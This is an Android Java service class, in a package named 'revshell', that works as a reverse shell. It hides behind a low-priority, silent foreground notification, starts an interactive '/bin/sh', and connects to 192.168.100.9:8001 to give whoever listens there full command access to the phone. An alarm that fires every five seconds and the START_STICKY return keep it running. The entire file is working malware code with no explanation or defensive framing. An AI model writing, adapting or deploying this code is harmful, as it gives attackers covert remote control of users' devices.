package com.example.revshell;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;

import android.os.Build;
import android.os.IBinder;
import android.os.StrictMode;

import androidx.core.app.NotificationCompat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class MyForegroundService extends Service {

    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "MyForegroundServiceChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    public void establishConnection() {
        int SDK_INT = android.os.Build.VERSION.SDK_INT;
        if (SDK_INT > 8)
        {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                    .permitAll().build();
            StrictMode.setThreadPolicy(policy);

            try {
                String[] cmd = {"/bin/sh","-i"};
                Process proc = Runtime.getRuntime().exec(cmd);
                InputStream proc_in = proc.getInputStream();
                OutputStream proc_out = proc.getOutputStream();
                InputStream proc_err = proc.getErrorStream();

                Socket socket = new Socket("192.168.100.9",8001);
                InputStream socket_in = socket.getInputStream();
                OutputStream socket_out = socket.getOutputStream();

                while(true){
                    while(proc_in.available()>0)  socket_out.write(proc_in.read());
                    while(proc_err.available()>0) socket_out.write(proc_err.read());
                    while(socket_in.available()>0)  proc_out.write(socket_in.read());
                    socket_out.flush();
                    proc_out.flush();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }catch (StringIndexOutOfBoundsException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("My Foreground Service")
                .setContentText("Running in the background")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVibrate(null)
                .setSound(null)
                .build();

        startForeground(NOTIFICATION_ID, notification);

        new Thread(new Runnable() {
            @Override
            public void run() {
                    establishConnection();
            }
        }).start();

        int interval = 5 * 1000;
        Intent alarmIntent = new Intent(this, MyAlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), interval, pendingIntent);

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public static void cancelNotification(Context ctx, int notifyId) {
        String ns = Context.NOTIFICATION_SERVICE;
        NotificationManager nMgr = (NotificationManager) ctx.getSystemService(ns);
        nMgr.cancel(notifyId);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
